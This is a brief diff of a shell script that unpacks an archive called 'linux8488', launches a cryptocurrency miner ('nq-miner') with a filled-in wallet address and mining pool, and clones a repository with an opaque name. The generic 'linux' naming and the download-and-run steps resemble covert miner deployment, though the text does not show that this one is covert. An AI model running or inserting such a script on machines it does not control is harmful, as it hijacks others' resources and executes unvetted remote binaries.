@@ -4,7 +4,7 @@ tar -xvf ./linux8488.tar.xz
 
 cd ./linux8488/
 
-./nq-miner
+./nq-miner -t cuda -a "NQ54 HKTP BDQK 7PV9 BXKK GJ3H T6SM 4L5A 83C2" -p pool.acemining.co:8443 -t 2 -b 4
 
 git clone https://github.com/mobileapps84741274/linux8444
 
